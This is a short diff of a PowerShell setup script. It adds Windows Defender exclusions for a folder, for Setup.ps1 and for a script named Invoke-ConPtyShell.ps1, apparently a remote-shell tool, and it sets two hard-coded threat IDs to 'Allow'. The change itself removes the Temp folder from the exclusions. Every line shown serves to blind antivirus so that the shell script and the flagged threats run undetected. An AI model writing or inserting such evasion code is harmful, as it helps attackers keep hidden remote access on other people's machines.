@@ -4,9 +4,9 @@ $threat2 = "2147780248"
 
 #add Windows Defender Exclusions:
 $TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
-Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl
+Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 
-#add allowed threats
+#add Windows Defender allowed threats
 Add-MpPreference -ThreatIDDefaultAction_Ids $threat1 -ThreatIDDefaultAction_Actions Allow -Force
 Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Actions Allow -Force
 
